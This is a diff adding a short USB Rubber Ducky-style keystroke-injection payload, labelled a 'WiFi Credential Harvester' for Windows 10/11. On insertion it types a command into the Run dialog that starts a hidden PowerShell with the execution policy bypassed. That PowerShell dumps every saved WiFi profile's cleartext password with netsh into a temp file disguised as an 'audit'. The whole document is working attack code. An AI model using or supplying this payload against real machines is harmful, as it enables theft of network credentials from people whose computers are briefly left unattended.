@@ -1,0 +1,14 @@
+REM ==============================================
+REM CYBERFLIPPER — WiFi Credential Harvester
+REM Inspired by Hak5 USB Rubber Ducky payloads
+REM Exports saved WiFi profiles & passwords
+REM ==============================================
+REM TARGET: Windows 10/11
+REM AUTHOR: @CYBERFLIPPER / FLLC
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"$out = $env:TEMP + \\\"\wifi_audit.txt\\\"; (netsh wlan show profiles) | Select-String \\\"All User Profile\\\" | ForEach-Object { $name = ($_ -split \\\":\\\")[1].Trim(); $detail = netsh wlan show profile name=$name key=clear; $pass = ($detail | Select-String \\\"Key Content\\\") -split \\\":\\\" | Select-Object -Last 1; \\\"$name : $pass\\\" | Out-File -Append $out }; Write-Host \\\"WiFi audit saved to $out\\\"\"' -WindowStyle Hidden"
+ENTER
+DELAY 5000
